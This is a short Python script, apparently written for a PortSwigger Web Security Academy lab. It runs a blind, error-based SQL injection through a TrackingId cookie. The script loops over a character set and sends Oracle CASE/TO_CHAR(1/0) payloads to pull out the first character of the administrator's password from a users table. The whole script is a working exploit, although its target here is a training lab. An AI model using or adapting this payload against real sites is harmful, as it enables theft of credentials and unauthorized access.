import requests



url="https://0aca00c803f219e8827a06fa0084009a.web-security-academy.net/"
cookies={
	'TrackingId' : "XuvNGanHmOL75Ke2" ,
	'session' : 'UjTeGMl3bEVuMdbHOWPrMvfaO7HKcP5G'
}
headers={
	'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'
}


c="azertyuiopqsdfghjklmwxcvbn0123456789ss"
for i in range(len(c)):
	cookies["TrackingId"]="' AND CAST((SELECT CASE WHEN SUBSTR(password, 1, 1)= '"+ c[i] +"' THEN 'a' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator') AS VARCHAR2(100))='a'  --"
	res=requests.get(url , cookies=cookies , headers=headers)
	if res.status_code == 200 :
		print("Working !!  --> "+c[i])
		break
	else : print(c[i] , res.status_code)
print(res.text)
print(res.status_code)



